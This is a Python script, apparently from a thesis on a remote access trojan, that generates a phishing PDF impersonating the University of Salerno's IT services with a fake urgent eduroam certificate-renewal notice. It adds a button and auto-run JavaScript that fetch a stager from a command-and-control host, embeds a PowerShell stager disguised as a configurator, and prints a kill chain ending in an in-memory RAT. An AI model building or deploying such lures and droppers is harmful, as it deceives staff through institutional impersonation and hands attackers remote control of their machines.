#!/usr/bin/env python3
"""
create_pdf_stager.py — UNISA RAT thesis (Giuseppe Mangiola)
Genera UnisaDocument.pdf con:
  - Visual lure stile UNISA — tema eduroam WiFi certificate renewal
  - JavaScript /OpenAction → app.launchURL(stager) eseguito all'apertura in Acrobat
  - stager.ps1 embedded come allegato PDF (percorso manuale)

Eseguire su Kali dopo aver avviato c2_server_v2.py:
    python3 create_pdf_stager.py

Dipendenze: pip install reportlab pypdf --break-system-packages
"""
import os
import sys
import subprocess
import tempfile
from pathlib import Path

# ── Configurazione ────────────────────────────────────────────────────────────
C2_HOST     = "192.168.122.47"
C2_PORT     = 443
OUTPUT      = Path(__file__).parent / "UnisaDocument.pdf"
STAGER_PATH = Path(__file__).parent.parent.parent / "client" / "stager.ps1"
LOGO_PATH   = Path(__file__).parent / "unisa_logo.png"
EDUROAM_LOGO = Path(__file__).parent / "Eduroam_logo.png"
# ─────────────────────────────────────────────────────────────────────────────


def _install(pkg: str) -> None:
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", pkg, "-q", "--break-system-packages"],
        stdout=subprocess.DEVNULL,
    )


def _ensure_deps() -> None:
    missing = []
    try:
        import reportlab  # noqa: F401
    except ImportError:
        missing.append("reportlab")
    try:
        import pypdf  # noqa: F401
    except ImportError:
        missing.append("pypdf")

    if missing:
        for pkg in missing:
            print(f"[*] Installo {pkg}...")
            _install(pkg)
        # Re-exec: la sessione corrente non vede i moduli appena installati
        print("[*] Riavvio lo script con le dipendenze installate...")
        os.execv(sys.executable, [sys.executable] + sys.argv)


# ── 1. Layout visuale (reportlab) ─────────────────────────────────────────────
def _build_visual(tmp_path: Path, c2_host: str, c2_port: int) -> None:
    """
    Genera il PDF con:
      - Header con logo stemma UNISA + intestazione ufficiale
      - Layout comunicazione formale (protocollo, destinatario, oggetto)
      - Tema: rinnovo certificato eduroam WiFi
      - Bottone cliccabile (link annotation) → Edge/Chrome/Acrobat
      - JavaScript OpenAction per Acrobat (bonus)
    """
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.colors import HexColor, white, black
    from reportlab.pdfgen import canvas
    from reportlab.lib.utils import ImageReader

    BLUE     = HexColor("#003087")
    GOLD     = HexColor("#C8A000")
    DARK     = HexColor("#1a1a1a")
    GRAY     = HexColor("#555555")
    LIGHT_BG = HexColor("#f4f6f9")
    RED_WARN = HexColor("#c0392b")
    GREEN    = HexColor("#1a7f37")

    launcher_url = f"https://{c2_host}:{c2_port}/launcher"

    c = canvas.Canvas(str(tmp_path), pagesize=A4)
    W, H = A4
    MARGIN = 50

    # ── Sfondo pagina leggermente grigio ─────────────────────────────────
    c.setFillColor(HexColor("#f9f9f9"))
    c.rect(0, 0, W, H, fill=1, stroke=0)

    # ── Header bianco con bordo inferiore blu ────────────────────────────
    HEADER_H = 90
    c.setFillColor(white)
    c.rect(0, H - HEADER_H, W, HEADER_H, fill=1, stroke=0)

    # Logo stemma (sinistra)
    logo_size = 68
    logo_x = MARGIN
    logo_y = H - HEADER_H + 11
    if LOGO_PATH.exists():
        try:
            img = ImageReader(str(LOGO_PATH))
            c.drawImage(img, logo_x, logo_y, width=logo_size, height=logo_size,
                        preserveAspectRatio=True, mask='auto')
        except Exception:
            pass

    # Logo eduroam (destra header)
    eduroam_size = 52
    eduroam_x = W - MARGIN - eduroam_size
    eduroam_y = H - HEADER_H + 19
    if EDUROAM_LOGO.exists():
        try:
            img_edu = ImageReader(str(EDUROAM_LOGO))
            c.drawImage(img_edu, eduroam_x, eduroam_y,
                        width=eduroam_size, height=eduroam_size,
                        preserveAspectRatio=True, mask='auto')
        except Exception:
            pass

    # Testo intestazione (destra del logo UNISA)
    tx = logo_x + logo_size + 14
    c.setFillColor(BLUE)
    c.setFont("Helvetica-Bold", 15)
    c.drawString(tx, H - 30, "Universita degli Studi di Salerno")
    c.setFont("Helvetica", 10)
    c.setFillColor(GRAY)
    c.drawString(tx, H - 44, "Segreteria — Servizi Informatici di Ateneo")
    c.drawString(tx, H - 57, "Rete Wi-Fi eduroam — Autenticazione IEEE 802.1x")

    # Linea oro separatrice header
    c.setStrokeColor(GOLD)
    c.setLineWidth(2.5)
    c.line(0, H - HEADER_H, W, H - HEADER_H)

    # ── Striscia blu sotto header (numero protocollo e data) ─────────────
    SUBBAR_H = 28
    c.setFillColor(BLUE)
    c.rect(0, H - HEADER_H - SUBBAR_H, W, SUBBAR_H, fill=1, stroke=0)
    c.setFillColor(white)
    c.setFont("Helvetica", 8.5)
    c.drawString(MARGIN, H - HEADER_H - 18,
                 "Prot. N.  UNISA/SIA/WIFI/2026/10/2198")
    c.drawRightString(W - MARGIN, H - HEADER_H - 18,
                      "Fisciano, 25 ottobre 2026")

    # ── Area corpo documento ─────────────────────────────────────────────
    body_top = H - HEADER_H - SUBBAR_H - 18

    # Oggetto
    c.setFillColor(DARK)
    c.setFont("Helvetica-Bold", 10)
    c.drawString(MARGIN, body_top, "OGGETTO:")
    c.setFont("Helvetica", 10)
    c.drawString(MARGIN + 58, body_top,
                 "Rinnovo obbligatorio del certificato di rete Wi-Fi eduroam")

    # Linea separatrice sottile
    c.setStrokeColor(HexColor("#cccccc"))
    c.setLineWidth(0.5)
    c.line(MARGIN, body_top - 8, W - MARGIN, body_top - 8)

    # Destinatario
    y = body_top - 26
    c.setFont("Helvetica", 10)
    c.setFillColor(DARK)
    c.drawString(MARGIN, y, "Spett.li Colleghe e Colleghi della Segreteria,")

    # Corpo lettera
    y -= 18
    paragraphs = [
        ("normal",
         "con la presente Vi informiamo che il certificato di autenticazione"),
        ("normal",
         "IEEE 802.1x associato alle utenze del personale di Segreteria per la"),
        ("normal",
         "rete Wi-Fi eduroam risulta in scadenza improrogabile il 17/11/2026"),
        ("normal",
         "alle ore 23:59. Il certificato viene utilizzato per l'accesso alla rete"),
        ("normal",
         "wireless nei campus di Fisciano e Baronissi tramite le Credenziali di"),
        ("normal",
         "Autenticazione Unificate (CAU)."),
        ("", ""),
        ("normal",
         "Il mancato rinnovo entro il termine indicato comportera la sospensione"),
        ("normal",
         "temporanea dell'accesso ai seguenti servizi di rete per le postazioni"),
        ("normal",
         "della Segreteria:"),
        ("", ""),
        ("bullet", "Connessione Wi-Fi eduroam in tutti i campus e le residenze UNISA"),
        ("bullet", "Accesso alle risorse di rete interne e ai sistemi gestionali"),
        ("bullet", "Servizi di autenticazione tramite portale wifi.unisa.it"),
        ("bullet", "Roaming accademico presso altri Atenei della federazione eduroam"),
        ("", ""),
        ("normal",
         "Al fine di garantire la continuita della connessione, Vi invitiamo a"),
        ("normal",
         "procedere al rinnovo automatico del certificato cliccando il pulsante"),
        ("normal",
         "sottostante. L'operazione richiede meno di un minuto e non comporta"),
        ("normal",
         "alcuna modifica alle Vostre credenziali CAU di Ateneo."),
    ]
    LINE_H = 15
    for kind, text in paragraphs:
        if kind == "":
            y -= 6
            continue
        if kind == "bullet":
            c.setFont("Helvetica", 10)
            c.setFillColor(BLUE)
            c.drawString(MARGIN + 10, y, "-")
            c.setFillColor(DARK)
            c.drawString(MARGIN + 22, y, text)
        else:
            c.setFont("Helvetica", 10)
            c.setFillColor(DARK)
            c.drawString(MARGIN, y, text)
        y -= LINE_H

    # ── Banner scadenza ──────────────────────────────────────────────────
    y -= 10
    warn_h = 34
    c.setFillColor(HexColor("#fdf2f2"))
    c.roundRect(MARGIN, y - warn_h, W - 2*MARGIN, warn_h, 5, fill=1, stroke=0)
    c.setStrokeColor(RED_WARN)
    c.setLineWidth(1)
    c.roundRect(MARGIN, y - warn_h, W - 2*MARGIN, warn_h, 5, fill=0, stroke=1)
    c.setFillColor(RED_WARN)
    c.setFont("Helvetica-Bold", 10)
    c.drawCentredString(W/2, y - 13,
                        "SCADENZA: 17/11/2026 ore 23:59 — Accesso Wi-Fi sospeso decorso il termine")
    y -= warn_h + 14

    # ── Bottone rinnovo ──────────────────────────────────────────────────
    btn_w, btn_h = 300, 36
    btn_x = (W - btn_w) / 2
    btn_y = y - btn_h

    c.setFillColor(GREEN)
    c.roundRect(btn_x, btn_y, btn_w, btn_h, 7, fill=1, stroke=0)
    c.setFillColor(white)
    c.setFont("Helvetica-Bold", 12)
    c.drawCentredString(W/2, btn_y + 12, "Aggiorna Certificato Wi-Fi eduroam")

    c.linkURL(launcher_url,
              (btn_x, btn_y, btn_x + btn_w, btn_y + btn_h),
              relative=0)

    y = btn_y - 14
    c.setFillColor(GRAY)
    c.setFont("Helvetica", 8)
    c.drawCentredString(W/2, y,
                        "Il pulsante scarica il configuratore EduroamAggiornamento.vbs — aprire il file per avviare l'aggiornamento.")
    y -= 12
    c.setFont("Helvetica", 7.5)
    c.setFillColor(GRAY)
    c.drawCentredString(W/2, y,
                        "Per informazioni sulla rete eduroam: https://wifi.unisa.it/")

    # ── Box informazioni protocollo ──────────────────────────────────────
    y -= 18
    info_h = 48
    c.setFillColor(white)
    c.roundRect(MARGIN, y - info_h, W - 2*MARGIN, info_h, 5, fill=1, stroke=0)
    c.setStrokeColor(HexColor("#d0d7e2"))
    c.setLineWidth(0.7)
    c.roundRect(MARGIN, y - info_h, W - 2*MARGIN, info_h, 5, fill=0, stroke=1)

    # Colonna sinistra
    c.setFont("Helvetica-Bold", 8)
    c.setFillColor(GRAY)
    c.drawString(MARGIN + 12, y - 14, "Numero protocollo")
    c.setFont("Courier-Bold", 10)
    c.setFillColor(BLUE)
    c.drawString(MARGIN + 12, y - 28, "UNISA/SIA/WIFI/2026/10/2198")
    c.setFont("Helvetica", 7.5)
    c.setFillColor(GRAY)
    c.drawString(MARGIN + 12, y - 40, "Emesso: 25/10/2026  |  Scad.: 17/11/2026 23:59")

    # Colonna destra — responsabile
    rx = W/2 + 20
    c.setFont("Helvetica-Bold", 8)
    c.setFillColor(GRAY)
    c.drawString(rx, y - 14, "Responsabile")
    c.setFont("Helvetica", 8.5)
    c.setFillColor(DARK)
    c.drawString(rx, y - 28, "Servizi Informatici di Ateneo — UNISA")
    c.setFont("Helvetica", 7.5)
    c.setFillColor(GRAY)
    c.drawString(rx, y - 40, "wifi@unisa.it  |  089 96 3022")

    # ── Footer ───────────────────────────────────────────────────────────
    footer_h = 38
    c.setFillColor(BLUE)
    c.rect(0, 0, W, footer_h, fill=1, stroke=0)
    c.setStrokeColor(GOLD)
    c.setLineWidth(2)
    c.line(0, footer_h, W, footer_h)
    c.setFillColor(white)
    c.setFont("Helvetica", 8)
    c.drawCentredString(W/2, 22,
                        "Universita degli Studi di Salerno — Via Giovanni Paolo II, 132 — 84084 Fisciano (SA)")
    c.drawCentredString(W/2, 10,
                        "www.unisa.it  |  wifi.unisa.it  |  helpdesk@unisa.it")

    c.save()


# ── 2. Iniezione JS OpenAction + allegato (pypdf) ─────────────────────────────
def _inject(base_pdf: Path, output: Path, stager: Path,
            c2_host: str, c2_port: int) -> None:
    from pypdf import PdfReader, PdfWriter

    # JavaScript eseguito all'apertura in Adobe Acrobat/Reader (JS abilitato)
    # app.launchURL apre la URL nel browser → download di stager.ps1
    # In Reader con Enhanced Security OFF (lab): spesso senza dialogo intermedio
    js = (
        f"try {{"
        f"  app.launchURL('https://{c2_host}:{c2_port}/stager', true);"
        f"}} catch(e) {{}}"
    )

    reader = PdfReader(str(base_pdf))
    writer = PdfWriter()

    for page in reader.pages:
        writer.add_page(page)

    # OpenAction JavaScript
    writer.add_js(js)
    print(f"[+] JavaScript OpenAction aggiunto")

    # stager.ps1 come allegato (percorso manuale alternativo)
    if stager.exists():
        writer.add_attachment("Configuratore_Eduroam_UNISA.ps1",
                              stager.read_bytes())
        print(f"[+] Allegato: {stager.name} ({stager.stat().st_size} bytes)")
    else:
        print(f"[!] stager.ps1 non trovato in {stager} — allegato omesso")

    with open(output, "wb") as f:
        writer.write(f)


# ── Main ──────────────────────────────────────────────────────────────────────
def main() -> None:
    _ensure_deps()

    print(f"[*] Generazione {OUTPUT.name} ...")

    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
        tmp_path = Path(tmp.name)

    try:
        _build_visual(tmp_path, C2_HOST, C2_PORT)
        print("[+] Layout visuale creato")

        _inject(tmp_path, OUTPUT, STAGER_PATH, C2_HOST, C2_PORT)

        kb = OUTPUT.stat().st_size // 1024
        print(f"\n[+] {OUTPUT.name} generato ({kb} KB)")
        print(f"[+] Kill chain (Edge/Chrome — link annotation):")
        print(f"    email → UnisaDocument.pdf → Edge apre il PDF")
        print(f"    → vittima clicca il bottone verde → Edge scarica EduroamAggiornamento.vbs")
        print(f"    → vittima esegue → powershell → rat.dll in memoria → Mode D")
        print(f"")
        print(f"[+] Kill chain (Adobe Acrobat/Reader — JS OpenAction):")
        print(f"    Stessa mail → Acrobat apre il PDF")
        print(f"    → JS si esegue automaticamente → browser scarica stager.ps1")
        print(f"")
        print(f"[+] Stager URL: https://{C2_HOST}:{C2_PORT}/stager")
        print(f"[+] Launcher URL: https://{C2_HOST}:{C2_PORT}/launcher")
        print(f"[+] Allegato Acrobat: Configuratore_Eduroam_UNISA.ps1")
    finally:
        tmp_path.unlink(missing_ok=True)


if __name__ == "__main__":
    main()
